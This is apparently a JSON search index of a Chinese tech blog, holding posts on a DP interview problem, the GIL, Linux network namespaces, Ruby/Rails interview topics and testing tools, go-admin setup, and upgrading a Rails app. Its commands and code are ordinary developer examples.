[{"title":"一個面試問題","url":"/2020/10/a-interview-question/","content":"動機\n面試遇到的問題，當下沒想到DP的解法，但考官好像也沒有往DP的方向提示(還是因為時間不夠…)\n但題目確實可以用DP解，所以就記錄下來\n\n問題\n類似子字串，字串的token用空格分開，看token是不是都存在在字串中\n“a b x c x”.isLikeSubStr(“a b c”) =&gt; Yes\n“a x c x”.isLikeSubStr(“a b c”) =&gt; No\nSol ver.1 &amp; Sol ver1.5 : Hash\n第1版是把兩個字串轉成hash table統計數量，再比較數量\n# Ver1 pesudoa = split_by_space_and_to_dict(strA)b = split_by_space_and_to_dict(strB)for k in b.keys():    if (k not in a) or (b[k] &gt; a[k]):        return Falsereturn True\n節省空間的版本，第1.5版是只轉第一個字串，之後把第二個字串的token往hash table裡面扣\n# Ver1.5 pesudoa = split_by_space_and_to_dict(strA)for k in split_by_space(strB):    if (k not in a) or (a[k] == 0):        return False    else:        a[k] -= 1return True\n變種: 順序\n現在多了要照順序這要求\n“a c x b x”.isLikeSubStr(“a b c”) =&gt; No (要照順序)\n這時候就是DP的時候，照順序就是遞迴的強烈暗示，或是說最佳子結構\nf[0][j] = (strA[0] == strB[j])f[i][j] = (strA[i] == strB[j]) and [f[x][j-1] for range(0,i)].any()\n列出兩條所有起點的可能性，就是一張len(strA)*len(strB)的表\n實際步驟如下\n\n\n從strB的第一個開始，所有等於第一個的token都標上true\n\n\n之後就是從有True的點從上一排開始往左邊找有沒有True\n\n\n只要最後的row有true就是true\n\n\n當前的結果都是只用上一層的答案，所以可以只用兩條array就完成dp\n空間複雜: len(strA)\n時間複雜: len(strA)*len(strB)\nDP 與 Hash的差異\nDP可以記下順序，但hash不行\n不過hash因為少了順序的限制，其時間複雜就是len(strA)，不是DP的len(strA)*len(strB)\n","categories":["Algorithm"]},{"title":"Global Interpreter Lock","url":"/2020/10/gil/","content":"動機\npython與ruby上用thread必要面對的課題\n \nGIL為什麼要存在\n\n省下替各個資料結構上鎖的煩惱\n在call C extension時不會出事\n如果只有語言自己的原生method調用，基本上可以當成thread-safe來使用 (python有保證，ruby在MRI也有)\n\n缺點\n\n只有一個thread可以在interpreter計算 (就是替{整個}interpreter加鎖，這效能只有單線程能看，多線程就是各thread競爭到死)\n不是說有GIL替thread加鎖就不用煩惱race condition的問題 (都有實作timer來搶GIL，如果配上自己的code不是只有語言自己的原生的東西的話就會出事，見下面的code)\n使用OS級的thread卻沒有發揮OS級的thread的效能\nGIL怎麼被搶，是看各個interpreter的實作，完全不知道什麼時候、情況下發生(有的是時間，有的是bytecode太長)\n\nsheep = false5.times.map do  Thread.new do    unless sheep      sheep = true      print(&quot;DONE&quot;)    end  endend.each(&amp;:join)\nsheep = Sheep.new5.times.map do  Thread.new do    unless sheep.shorn?      sheep.shear!    end  endend.each(&amp;:join)\n如何相處\n\n好好地上鎖或是用blocking queue\n在IO重的code上用thread，這正是唯一能享受到多線程好處的地方\n用fork… 或用 C…\n\nRef\nRuby 无人知晓的 GIL\n深入 GIL: 如何寫出快速且 thread-safe 的 Python\nPython的GIL是什么鬼，多线程性能究竟如何\nSee also: Green_threads\n","categories":["System","Parallel"]},{"title":"netns與虛擬網路裝置","url":"/2020/10/netns-note/","content":"動機\n雖然說是netns筆記，但其實主要是說linux的虛擬網路裝置…\n\nTUN/TAP\nTUN/TAP 可以想成一個網卡但與某個fd直連\n所以有 TUN/TAP 有兩個 input與output 的來源\n\n網路\nfd =&gt; OS中跑的程式\n\nTUN可以看到IP層，TAP可以看到第二層\n這個與一般用socket來read不同的是，我們不用聽到tcp或udp的port\n雖然聽起來很像廢話，但都是write/read，我們能一般都是用tcp或udp，但TUN/TAP讓我們有能力看到第三、二層的封包。\nTUN/TAP整體更像一個userspace與kernelspace溝通的手段，中間透過network stack這樣\nveth-pair &amp; bridge\n可以想成有兩張網卡(TUN)直接用線接起來，主要搭配bridge(brctl)使用，這樣就可以模擬把線插在一般的switch\n下面是用veth-pair連結兩個netns\n# add the namespacesip netns add ns1ip netns add ns2# create the veth pairip link add tap1 type veth peer name tap2# move the interfaces to the namespacesip link set tap1 netns ns1ip link set tap2 netns ns2# bring up the linksip netns exec ns1 ip link set dev tap1 upip netns exec ns2 ip link set dev tap2 up# add ipip netns exec ns1 ip a add 192.168.123.1/24 dev tap1ip netns exec ns2 ip a add 192.168.123.2/24 dev tap2\n把veth換成實體的網卡，就可以跑local breakout了，而方法也差不多，不過不用加網卡(ip link add)，把link set的dev name換成要加的網卡就好\nmacvlan\n可以想成 veth-pair &amp; bridge 的打包一次到好的版本\n同樣都是可以在L2把大家連在一起\n有不同的模式\n\nbridge mode: 功能與veth-pair &amp; bridge一樣，透過bridge(software)來route\nVEPA mode: 與bridge mode不同的點是 透過外面的switch(hardware) 來route\nprivate mode: 誰都不能通信\nPassthru mode: veth-pair\n\n要注意的是macvlan不能用在802.11，還有macvlan每多一個網卡就會吃掉一個MAC\nipvlan\n與macvlan很像，但可以運作在第三層\n那兩者的差別在\n\nipvlan可以共用實體port的MAC，macvlan每多一個網卡就會吃掉一個MAC\n\nipvlan有L2與L3 mode\n兩者差別是\n\nL2的broadcast在L3 mode不會被處理，L2會\n\nmacvtap/ipvtap\n就是macvlan/ipvlan的網卡，可以有TAP/TUN的功能，可以用fd寫與收資料了\nbridge\nL2的switch\n可以用brctl改相關設定，像stp之類的\n下面是用bridge配合veth pair把兩個netns連起來\n# add the namespacesip netns add ns1ip netns add ns2# create the switchBRIDGE=br-testbrctl addbr $BRIDGEbrctl stp   $BRIDGE offip link set dev $BRIDGE up##### PORT 1# create a port pairip link add tap1 type veth peer name br-tap1# attach one side to linuxbridgebrctl addif br-test br-tap1 # attach the other side to namespaceip link set tap1 netns ns1# set the ports to upip netns exec ns1 ip link set dev tap1 upip link set dev br-tap1 up##### PORT 2# create a port pairip link add tap2 type veth peer name br-tap2# attach one side to linuxbridgebrctl addif br-test br-tap2# attach the other side to namespaceip link set tap2 netns ns2# set the ports to upip netns exec ns2 ip link set dev tap2 upip link set dev br-tap2 up# add ipip netns exec ns1 ip a add 192.168.123.1/24 dev tap1ip netns exec ns2 ip a add 192.168.123.2/24 dev tap2\nRef\n利用 Linux tap/tun 虚拟设备写一个 ICMP echo 程序\nMacvlan 和 IPvlan\nLinux网络虚拟化相关的虚拟网卡-VETH/MACVLAN/MACVTAP/IPVLAN(转载)\nlinux 网络虚拟化： ipvlan\nIntroduction to Linux interfaces for virtual networking\nnetwork namespace连接的4种方法及性能\n","categories":["Network","Tips"]},{"title":"rails常見面試問題整理","url":"/2020/10/rails-ruby-faq/","content":"動機\n也許有需要，也複習一下rails\n\n||=\nfoo, bar = [], 1foo ||= bar # foo = foo || barfoo\n這邊弔詭的是false value，也就是什麼value會被視為false\n\nhash default value\ndefault value不會自己被copy喔\n還有後面看到的值寫不進去hash，應該牽涉到ruby處理method call的方式\na = hsh[:something]a.send(:=, val)\nhsh = Hash.new([])hsh[:one] &lt;&lt; &#x27;one&#x27;hsh[:two] &lt;&lt; &#x27;two&#x27;hsh[:nonexistent]# =&gt; [&#x27;one&#x27;, &#x27;two&#x27;]hsh# =&gt; &#123;&#125;\nhsh = Hash.new([])hsh[:one] += [&#x27;one&#x27;]hsh[:two] += [&#x27;two&#x27;]# This is syntactic sugar for hsh[:two] = hsh[:two] + [&#x27;two&#x27;]hsh[:nonexistant]# =&gt; []hsh# =&gt; &#123; :one =&gt; [&#x27;one&#x27;], :two =&gt; [&#x27;two&#x27;] &#125;\nhsh = Hash.new &#123; [] &#125;# This time, instead of a default *value*, we use a default *block*hsh[:one] &lt;&lt; &#x27;one&#x27;hsh[:two] &lt;&lt; &#x27;two&#x27;hsh[:nonexistent]# =&gt; []# We *did* mutate the default value, but it was a fresh one every time.hsh# =&gt; &#123;&#125;# But we never mutated the hash itself, therefore it is still empty!\nhsh = Hash.new &#123;|hsh, key| hsh[key] = [] &#125;hsh[:one] &lt;&lt; &#x27;one&#x27;hsh[:two] &lt;&lt; &#x27;two&#x27;hsh[:nonexistent]# =&gt; []# We *did* mutate the default value, but it was a fresh one every time.hsh# =&gt; &#123; :one =&gt; [&#x27;one&#x27;], :two =&gt; [&#x27;two&#x27;], :nonexistent =&gt; [] &#125;\nproc &amp; lambda &amp; block\nblock沒有apply的一串代碼\nlambda正常的lambda\nproc有點像macro(可以當成裡面的code複製貼上)，但有自己的scope\ndef whowouldwin  mylambda = lambda &#123;return &quot;Freddy&quot;&#125;  mylambda.call  # mylambda gets called and returns &quot;Freddy&quot;, and execution  # continues on the next line  return &quot;Jason&quot;endwhowouldwin#=&gt; &quot;Jason&quot;\n# Proc returns control not just from the proc, but also from the method enclosing the proc!def whowouldwin2  myproc = Proc.new &#123;return &quot;Freddy&quot;&#125;  myproc.call  # myproc gets called and returns &quot;Freddy&quot;,   # but also returns control from whowhouldwin2!  # The line below *never* gets executed.  return &quot;Jason&quot;endwhowouldwin2         #=&gt; &quot;Freddy&quot;\nequal\n\n== : 值\neql? : 值 &amp; type\nequal? : 記憶體位置\n=== : lhs.includes?(rhs)\n\np Fixnum === 1 # =&gt; truep 1 === Fixnum # =&gt; falsep 100 == 100.0 # =&gt; truep 100.eql? 100.0 # =&gt; false\ntap\n就是把instance丟到block中跑再丟回原本的instance\n# x 就是物件，caller，或是receiver(1..5).tap &#123; |x| puts &quot;element: #&#123;x.inspect&#125;&quot; &#125;.to_a  # =&gt; element: 1..5  .tap &#123; |x| puts &quot;array: #&#123;x.inspect&#125;&quot; &#125;  # =&gt; array: [1, 2, 3, 4, 5]  .select &#123; |x| x%2 == 0 &#125;  .tap&#123; |x| puts &quot;evens: #&#123;x.inspect&#125;&quot; &#125;   # =&gt; evens: [2, 4]  .map&#123; |x| x*x &#125;  .tap&#123; |x| puts &quot;squares: #&#123;x.inspect&#125;&quot; &#125;   # =&gt; squares: [4, 16]\nPresent and exist\npresent: 看是不是false value\n[ &quot;&quot;, &quot; &quot;, false, nil, [], &#123;&#125; ].any?(&amp;:present?)# =&gt; false\n用在orm上會悲劇\nUser.where(name: &#x27;mike&#x27;).present?# User Load (8.1ms) SELECT &quot;users&quot;.* FROM &quot;users&quot; WHERE &quot;users&quot;.&quot;name&quot; = $1 ORDER BY users.id ASC  [[&quot;name&quot;, &#x27;mike&#x27;]]\nexist: 基本上是用在orm上，看有沒有row存在\nUser.exists?(name: &#x27;mike&#x27;)# User Exists (2.4ms)  SELECT 1 AS one FROM &quot;users&quot; WHERE &quot;users&quot;.&quot;name&quot; = $1 ORDER BY users.id ASC LIMIT 1  [[&quot;name&quot;, &#x27;mike&#x27;]]# 如果是any? 1 AS one的部分會變成COUNT(*)\nfreeze\nfreeze可以當成c++的const\n所以會有\n\nint* - pointer to int\nint const * - pointer to const int\nint * const - const pointer to int\n\n就是在Pointer上的const或是在pointer內容的const\nN+1 query\nclass User &lt; ActiveRecord::Base  has_many :clientsendclass Client &lt; ActiveRecord::Base  has_many :contacts  belongs_to :userendclass Contact &lt; ActiveRecord::Base  belongs_to :clientend@contacts = @user.clients.includes( :contact )\nclass Post &lt; ActiveRecord::Base  has_many :comments  belongs_to :userendclass Comment &lt; ActiveRecord::Base  has_many :replies  belongs_to :userendclass Reply &lt; ActiveRecord::Base  belongs_to :userendclass User &lt; ActiveRecord::Base  has_many :posts  has_many :comments  has_many :repliesend# 不包含userPost.includes(:comments =&gt; [:replies])# 包含userPost.includes(:user, :comments= &gt; [:user, &#123;:replies =&gt; [:user]&#125;])\n如果是在別的table的東西就可以先用includes來preload\ntest data: fixture &amp; factory bot\nRails內建有Fixture功能可以建立假資料，方法是為每個Model使用一份YAML資料。\nFixture的缺點是它是直接插入資料進資料庫而不使用ActiveRecord，對於複雜的Model資料建構或關連，會比較麻煩。\nFactoryGirl這套工具，相較於Fixture的缺點是建構速度較慢。\norder = FactoryBot.create(  :order,  line_items: [FactoryBot.create(:line_item, price_cents: 40000)],  payments: [FactoryBot.create(:payment, amount_cents: 40000)])\n# orders.ymlpayments_equal_line_item_total:  # no attributes needed# line_items.ymlelectric_dog_polisher:  order: payments_equal_line_item_total  name: &#x27;Electric dog polisher&#x27;  price_cents: 40000# payment_methods.ymlvisa:  name: &#x27;Visa&#x27;# payments.ymlfirst:  order: payments_equal_line_item_total  payment_method: visa  amount_cents: 40000# order = orders(:payments_equal_line_item_total)\nRESTful &amp; CURD\n這裡可以看成對array操作\n像\narr # events_path, GETarr[i] # event_path(@event), GETarr &lt;&lt; &quot;something&quot; # events_path, POSTarr.delete(i) # event_path(@event), DELETEarr.update(i, &quot;something&quot;) # event_path(@event), PATCH/PUT\n那為什麼需要\n\nedit_event_path(@event)\nnew_event_path\nevent_path(@event)\n\n的GET\n因為我們透過網頁與user互動，把input轉成資料再調用診真正的action\n\n\n\nhelper\nGET\nPOST\nPATCH/PUT\nDELETE\n\n\n\n\nevent_path(@event)\n/events/1 : show action\n\n/events/1 : update action\n/events/1 : destroy action\n\n\nevents_path\n/events : index action\n/events : create action\n\n\n\n\nedit_event_path(@event)\n/events/1/edit : edit action\n\n\n\n\n\nnew_event_path\n/events/new : new action\n\n\n\n\n\n\nhow to handle req &amp; header\n\norm callback\n\nRef\n菜鳥Rails工作面試初體驗\nJr. Ruby on Rails Engineer面試初體驗（上）\nSee also: 我的中高階 Rails 工作面試心得分享\n面試 interview Ruby 重要概念整理\nRuby hash default value behavior\nRuby面試精選30題 - Day29 Ruby的tap method\nRuby面試精選30題 - Day23 Ruby的’==‘，’===’ ‘eql?’ ‘equal?’\nWhen to use lambda, when to use Proc.new?\nRails 用巢狀include和查表方式來避免 n+1 query\nA Visual Guide to Using :includes in Rails\nRuby on Rails 實戰聖經\nFactories and fixtures in Rails\nSee also: Fast Ruby\n","categories":["Rails","FAQ"]},{"title":"ruby奇妙的繼承","url":"/2020/10/ruby-inheritance-etc/","content":"動機\n寫寫ruby奇妙的繼承\n但原本寫好的metaclass的文居然失蹤了!!!\n我找不到…\n之後會補…\n\n因為原本寫metaclass的文章不見了，所以只好臨時補一個來說明metaclass\n其實大家都是instance\n結構大概像\nstruct instance &#123; // a.k.a. metaclass\tinstance* _meta; // only storing sigleton methods\tinstance* _class;\tinstance* _parent_class;\tvector&lt;Val&gt; _i_vals;\tvector&lt;Symbol&gt; _i_vars;\tMap&lt;Symbol, Method&gt; _m_env;&#125;;\n所以\ninstance method是 _class 的 _m_env\nclass method是 _class 的 _meta 的 _m_env\nsingleton method是 _meta 的 _m_env\n這裡的metaclass是一種資料結構\n在python的metaclass是這裡的_class(是什麼class)\n在ruby的metaclass是這裡的_meta(多出來放東西的地方)\ninheritance\n在用parent class的m-env擴張child class的m-env的同時\n因為child class有了到parent class的ref，就可以使用parent class的singleton method\nclass A  def self.a    p &quot;a&quot;  end  def b    p &quot;b&quot;  endendclass B &lt; A  a  p &quot;x&quot;  self.aendx = B.newx.b=beginaxab=end\ninclude &amp; extend\nclass與module的差異在一個只能繼承，一個只能include與extend\n被include與extend的method都只看m-env的部分，就是instance method的部分\nextend就是擴充該實體instance的class的meta中的m-env (class method)\ninclude就是擴充該實體instance的m-env (instance method)\nmodule InstanceMethods  def self.A    &quot;in A&quot;  end  def an_instance_method    &quot;You called an_instance_method on #&#123;self.class&#125;&quot;  end  def self.included(base)    p &quot;from include&quot;  endendmodule ClassMethods  def self.B    &quot;in B&quot;  end  def a_class_method    &quot;You called a_class_method_from_module on #&#123;self&#125;&quot;  end  def self.extended(base)    p &quot;from extend&quot;  endendclass MyClass  include InstanceMethods  extend ClassMethodsendmy_class = MyClass.newputs my_class.an_instance_method # &gt;&gt; You called an_instance_method on MyClass#puts my_class.A#puts my_class.Bputs MyClass.a_class_method      # &gt;&gt; You called a_class_method on MyClass#puts MyClass.A#puts MyClass.Bobj = Object.newobj.extend InstanceMethodsputs obj.an_instance_method\nRef\nExtending your include knowledge of Ruby\nRuby Sub-Classes/Inheritance, Include, And Extend\n","categories":["Rails","FAQ"]},{"title":"setup-go-admin","url":"/2020/10/setup-go-admin/","content":"動機\n在建go的service時，省一點力?!\n\nWhy did you choose this?\n我試過\n\nGoAdminGroup/go-admin: 自動生成管理table的code的部分悲劇，一直失敗，還要自己改生出來的code\nqor/admin: 跑readme的範例就直接爆類似segment fault的錯!? 這真的是現代PL嗎?\n\n目前有成功透過自動生成code的功能去操作db的就只有這一款\nSetup DB (mysql 15.1)\n用mysql的密碼認證\n原本是用auth_socket會看linux的帳號與mysql的密碼，所以如果是用root去連\n要用sudo mysql -u root -p，sudo不可少，所以會讓其他程式沒辦法用root登\n這裡是為了測試go-admin所以先用比較簡單(十分不安全)的方法，應該要另外開個這帳號給go-admin，但這只是測試so…\n如果想開另一個帳號與設定mysql見這裡的第二個方法\n$ sudo mysql -u root # I had to use &quot;sudo&quot; since is new installationmysql&gt; USE mysql;mysql&gt; UPDATE user SET plugin=&#x27;mysql_native_password&#x27; WHERE User=&#x27;root&#x27;;mysql&gt; FLUSH PRIVILEGES;mysql&gt; exit;\ninit DB &amp; 建新的database\n$ sudo mysql_secure_installation$ mysql -u root -pmysql&gt; craete database forgo;\nSetup go-admin\nclone codes\nmkdir demo &amp;&amp; cd demogit clone https://github.com/go-admin-team/go-admin.gitgit clone https://github.com/go-admin-team/go-admin-ui.git\nchange config &amp;&amp; build\n# ....  database:    driver: mysql    source: root:mypw@tcp(127.0.0.1:3306)/forgo?charset=utf8&amp;parseTime=True&amp;loc=Local&amp;timeout=1000ms # change this  gen:    dbname: forgo # change this    frontpath: ../go-admin-ui/src\n改完後，在go-admin的資料夾中跑api server\ngo build./go-admin migrate # 生table./go-admin server\n之後是到go-admin-ui跑ui server\nnpm inpm run dev\ngenerate code for our table\n假設有以下table\nCREATE TABLE `article` (  `title` varchar(128) DEFAULT NULL COMMENT &#x27;标题&#x27;,  `author` varchar(128) DEFAULT NULL COMMENT &#x27;作者&#x27;,  `content` varchar(255) DEFAULT NULL COMMENT &#x27;内容&#x27;,  /* 下面的column是go-admin要用的，不知道能不能自定義 */  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT &#x27;编码&#x27;,  `created_at` timestamp NULL DEFAULT NULL,  `updated_at` timestamp NULL DEFAULT NULL,  `deleted_at` timestamp NULL DEFAULT NULL,  `create_by` int(11) unsigned DEFAULT NULL,  `update_by` int(11) unsigned DEFAULT NULL,  PRIMARY KEY (`id`),  KEY `idx_article_deleted_at` (`deleted_at`) USING BTREE) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8mb4 COMMENT=&#x27;文章&#x27;;\n\n\n先選要被管理的table，就找圖上的順序\n\n\n\n接著是產生code\n\n\n\n放到旁邊的菜單\n\n\n\n關掉server，go build，再開一次\n我不確定要不要重編，但保險?\n\n\n剛加完菜單直接去按會吃\n2020-10-10 02:25:48 [WARING] GET /api/v1/sysfiledirList GetUserIdStr 缺少identity\n的錯…\n\n之後就可以CURD\n\n\n","categories":["Golang","Tips"]},{"title":"Rails的測試Survey","url":"/2020/10/testing-survey/","content":"動機\n寫測試之前先看怎麼寫測試\n\n怎樣的程式叫{一樣}?\n程式碼一樣，就是一樣。\n但我們不可能知道所有程式碼，所以可以\n\n看是不是可以從A程式藉由公理改寫到B程式 (Program derivation)\n只看兩個程式的輸入輸出是否一樣 (Behavioral equivalence)\n\n我們可以把輸入輸出抽象(type)，再配合公理，看是不是可以得到想要的type (static analysis)\n實際跑看能不能拿到想要的值(testing)\n怎麼觀察程式? (怎麼設計test)\n\n他會吃什麼? type，形式…\na. 在 input type中的理想或是最好處理的input\nb. 在 input type中的edge case\nc. 在 input type中的不合法、不被處理的input\nd. 不是input type的input\n他會給什麼? type，形式…\na. 合法輸入的結果\nb. 非法輸入的結果: 錯誤訊息或是有規律的輸出\n使用會發生什麼事 (會影響到其他人嗎)\n程式的輸入、輸出、狀態是怎麼對應到目的?\n使用前有什麼前提\na. 這程式都是在特定情況下被呼叫? (spesific or general)\nb. 被call的環境、順序 (call stack、userstory)\n\n前四點都是寫測試內容要考慮到的，第一點也決定要不要用假物件，最後一點是如何切分測試的依據\n從內部看就是用call stack去規劃，如果是rails就有一個是\n\nmodel : 只測試model (in Rails Guide: Model Testing)\nmodel controller : 測試{一個}controller (in Rails Guide: Functional Tests)\nmodel controller+ : 測試{多個}controller (in Rails Guide: Integration Testing)\nmodel controller+ view : 測試view (in Rails Guide: System Testing)\n\n從外部看就是依據使用情境來規劃\n小總結一下\n\n從裡面: 內部狀態與流程如何對應到外部輸入與輸出\n從外面: 輸入與輸出是不是符合預期\n\n從裡面看的測試就是 Unit test 與 integration test\n從外面看的測試就是 system test 與 acceptance test\n假物件就是只會給出特定值得物件，通常是取代其他需要會產生任意input或是花時間的input\n術語\n主要是Rspec in rails的術語，畢竟\n\n這是rails相關的文章，同時\nRspec有許多自己的術語，\n\n要先把他與rails guide上與一般術語之間的關聯找出來\n\nRspec術語 =&gt; Guide上的術語 (一般聊天時用的術語)\nFeature spec =&gt; System Testing (acceptance test OR end-to-end test)\nController specs =&gt; Functional Tests (如果model測完就叫unit test，沒測完就叫integration test)\nRequest spec =&gt; Integration Testing (integration test)\nModel specs =&gt; Model Testing (unit test)\n\n還有testing中會用到假物件，因為像io或是db之類的處理可能會花許多時間，但我們只在意他的output，所以可以用假物件模擬output，這是他的主要精神(還有滿足interface要求的空值也算假物件)，但不知道為什麼奇怪的術語有點多，所以把相關文章放在參考\nRspec : test runtime\n$count = 0describe &quot;let&quot; do  let(:count) &#123; $count += 1 &#125;  # let!(:count) =&gt; before(:each) &#123; count &#125;  it &quot;memoizes the value&quot; do    count.should == 1 # $count += 1 is executed    count.should == 1 # $count += 1 is not executed  end  it &quot;is not cached across examples&quot; do    count.should == 2 # $count += 1 is executed  endenddescribe Order do  describe Thing do    before(:all) do      @thing = Thing.new    end  describe &quot;initialized in before(:all)&quot; do    it &quot;has 0 widgets&quot; do      @thing.should have(0).widgets    end    it &quot;can get accept new widgets&quot; do      @thing.widgets &lt;&lt; Object.new    end    it &quot;shares state across examples&quot; do      @thing.should have(1).widgets    end  end  end  describe &quot;#amount&quot; do    context &quot;when user is vip&quot; do      before(:each) do        @user = User.new( :is_vip =&gt; true )        @order = Order.new( :user =&gt; @user )      end      # after(:each) OR after(:all)      it &quot;should discount five percent if total &gt;= 1000&quot; do        @order.total = 2000        expect(@order.amount).to eq(1900)      end      it &quot;should discount ten percent if total &gt;= 10000&quot; do        @order.total = 10000        expect(@order.amount).to eq(9000)      end    end    context &quot;when user is vip&quot; &#123; ... &#125;  endend\nCapybara : interface to browser\n\nBy default Capybara will only locate visible elements.\nThis is because a real user would not be able to interact with non-visible elements.\n\n基本動作(user的動作)\n\n開網頁: visit(post_comments_path(post))\n點擊: click_link('id-of-link'); click_button('Save'); click_on('Link Text')\na. 處理跳出視窗:accept_alert &#123; click_link('Show Alert') &#125;; dismiss_confirm &#123; click_link('Show Confirm') &#125;\n輸入\na. 文字: fill_in('First Name', with: 'John')\nb. 檔案: attach_file('Image', '/path/to/image.jpg')\nc. checkbox: check('A Checkbox'); uncheck('A Checkbox')\nd. radiobox: choose('A Radio Button')\ne. droplist: select('Option', from: 'Select Box')\n有我要的內容嗎: expect(page).to have_content('foo')\n\n比較偏開發者\n\nDOM related\na. 有DOM嗎: page.has_selector?('table tr'); expect(page).to have_css('table tr.foo')\nb. 拿到DOM: find_field('First Name').value; find_link(class: ['some_class', 'some_other_class'], :visible =&gt; :all).visible?\n在一定區域內做事: within_fieldset('Employee') &#123; fill_in 'Name', with: 'Jimmy' &#125;\n(debug) screenshot &amp; current HTML: save_and_open_page; print page.html; page.save_screenshot('screenshot.png')\n\nfactory_bot : generate objects\nFactoryBot.define do  #factory :access_token, class: User do  factory :user, aliases: [:author, :commenter] do    transient do # ARGS      rockstar &#123; true &#125;    end    first_name &#123; &quot;John&quot; &#125;    last_name &#123; &quot;Doe&quot; &#125;    name &#123; &quot;#&#123;first_name&#125; #&#123;last_name&#125;#&#123;&quot; - Rockstar&quot; if rockstar&#125;&quot; &#125; # create(:user, rockstar: false).name =&gt; &quot;John Doe&quot;    date_of_birth &#123; 18.years.ago &#125;    factory :VIP do # inherence      enroll_date &#123; Time.now &#125;      # create(:VIP).name =&gt; &quot;John Doe&quot;       # create(:VIP).enroll_date =&gt; &#123;today date&#125;    end    trait :male do      sex &#123; &quot;male&quot; &#125;    end    trait :female do      sex &#123; &quot;female&quot; &#125;    end    factory :male_user,    traits: [:male] # looks like inherence    factory :female_user,   traits: [:male, :female] # override by the last trait    # create(:user, :male)  end  factory :post do    # The alias allows us to write author instead of    # association :author, factory: :user    author # belong_to    # For has_may or has_and_belongs_to_many association,    # go to offical doc to learn how to use it    title &#123; &quot;How to read a book effectively&quot; &#125;    body &#123; &quot;There are five steps involved.&quot; &#125;  end  factory :comment do    # The alias allows us to write commenter instead of    # association :commenter, factory: :user    commenter    body &#123; &quot;Great article!&quot; &#125;  endend# Returns a User instance that&#x27;s not saveduser = build(:user, first_name: &quot;Joe&quot;)# Returns a saved User instanceuser = create(:user)# Returns a hash of attributes that can be used to build a User instanceattrs = attributes_for(:user)# Returns an object with all defined attributes stubbed outstub = build_stubbed(:user)\nfaker : some input without any typing\n就是幫你把需要的字串(資料)打完可以直接call\nRef\nBehavioral Equivalence\n測試中常見的名詞：Stub, Dummy, Mock…等等\nTesting Rails Applications\nThe difference between integration tests and controller tests in Rails\n一次搞懂單元測試、整合測試、端對端測試之間的差異\nRuby on Rails 實戰聖經 - 自動化測試\nBefore and after hooks\ncapybara DSL\nfaker\nfactory_bot Getting Started\nSee Also: A fixture-based approach to interface testing in Rails\n","categories":["Rails","FAQ"]},{"title":"升級rails","url":"/2020/10/upgrade-rails/","content":"動機\n把以前的專案升級，不然這作品不能看…\n\n步驟\n\n改Gemfile，把所有版本號砍掉，只留下rails\nbundle update\nTHOR_MERGE=“diff” rails app:update\n跑測試，確保每一頁都能動qqqq(自動測試的重要qqqq)\n\n下面就是在每個升級的階段遇到的問題\nrails 4 to rails 5\n1. Please specify merge tool to THOR_MERGE env.\n指定merge的指令就好，想一勞永逸\nexport THOR_MERGE=&quot;diff&quot;\n2. Directly inheriting from ActiveRecord::Migration is not supported\n錯誤訊息大概像這樣\nStandardError: An error has occurred, this and all later migrations canceled:Directly inheriting from ActiveRecord::Migration is not supported. Please specify the Rails release the migration was written for:  class RolifyCreateRoles &lt; ActiveRecord::Migration[4.2]/Users/brandoncordell/Code/dsk_group/db/migrate/20170307143104_rolify_create_roles.rb:1:in `&lt;top (required)&gt;&#x27;/Users/brandoncordell/Code/dsk_group/bin/rails:9:in `require&#x27;/Users/brandoncordell/Code/dsk_group/bin/rails:9:in `&lt;top (required)&gt;&#x27;/Users/brandoncordell/Code/dsk_group/bin/spring:15:in `&lt;top (required)&gt;&#x27;bin/rails:3:in `load&#x27;bin/rails:3:in `&lt;main&gt;&#x27;\n解法，把migration換掉\ngrep -rl &quot;Migration&quot; . | xargs  sed -i &#x27;s/ActiveRecord::Migration/ActiveRecord::Migration[5.0]/g&#x27;\n3. Array values in the parameter to Gem.paths= are deprecated.\n雖然說是警告，解法\nbundle update springbundle exec spring binstub --remove --allbundle exec spring binstub --all\n4. Sprockets::FileNotFound - couldn’t find file ‘base.source.coffee’\n這應該算是臨時解法，但之後會換成webpack所以先這樣吧\n在config/environments/development.rb\n把asset compile關掉\nconfig.assets.debug = false\n5. Expected to find a manifest file in app/assets/config/manifest.js (Sprockets::Railtie::ManifestNeededError)”\n當初處理這個是直接生檔案，這樣就不會報錯，但這個問題好像與上一個有關…\nmkdir -p app/assets/configcat &lt;&lt; END &gt;&gt; app/assets/config/manifest.js//= link_tree ../images//= link_directory ../javascripts .js//= link_directory ../stylesheets .css\n6. Undefined method raise_in_transactional_callbacks=’ for ActiveRecord::Base:Class (NoMethodError)\n把config/application.rb的\nconfig.active_record.raise_in_transactional_callbacks = true\n註解掉\n7. rails generate devise:install 卡住\nspring stop\n8. Couldn’t find Admin::BaseHelper, expected it to be defined in helpers/admin/base_helper.rb\n明明就在…\n解法\n在 config/development.rb 設定\nconfig.action_controller.include_all_helpers = false \n9. NoMethodError: undefined method new for BigDecimal:Class\nRuby不能用超過2.5\nrails 5 to rails 6\n1. Resource must exist\n這是Rails5之後，要求所有belong_to必須是require\n也就是外鍵必須存在\n所以把 app/model/role.rb 改一下\nbelongs_to :resource,             :polymorphic =&gt; true,             :optional =&gt; true # add this\n其實如果跑rolify install 就會有新的檔案，但當初我選合併…\n所以差不多的code出現兩次，進而出現很奇怪的結果(this title)\n2. 改繼承ApplicationRecord\n自rails5後，model都是從ApplicationRecord繼承，所以要把ActiveRecord::Base換掉\n新增 app/models/application_record.rb\nclass ApplicationRecord &lt; ActiveRecord::Base  self.abstract_class = trueend\n把所有ActiveRecord::Base換成ApplicationRecord\n3. load_defaults\n改config/application.rb，升級成rails6\nconfig.load_defaults 6.0\n4. User#index not exists\n這是升級devise的鍋，我也不知道為什麼會出事??\n加上需要的controller就好\ndef index  redirect_to root_pathend\n為什麼不先寫測試\n以前當學生東西會動就好，根本不會想到要加測試…\n像升級 或是 改、加功能只要測試跑下去就好，多輕鬆\n下一次就是加測試，但測試是要測試什麼感覺要研究一下\n像升級就是會錯在一些感覺不會錯的地方(不是自己程式邏輯的錯)，像是\n\napi的signature改變\n新rails多新code\nClass改名字\ndeprecated method\n\n心得\n\n善用merge tool (好好看完再merge)\n寫測試\n小心警慎\n\nRef\nRails 5: How Do I Set Up a Merge Tool to use for rails app:update?\nRails 5: Array values in the parameter to Gem.paths= are deprecated\nRails 6 sprockets error, cannot find source.coffee file\nWhy does Rails fails to boot with “Expected to find a manifest file in app/assets/config/manifest.js (Sprockets::Railtie::ManifestNeededError)”?\nUndefined method raise_in_transactional_callbacks=’ for 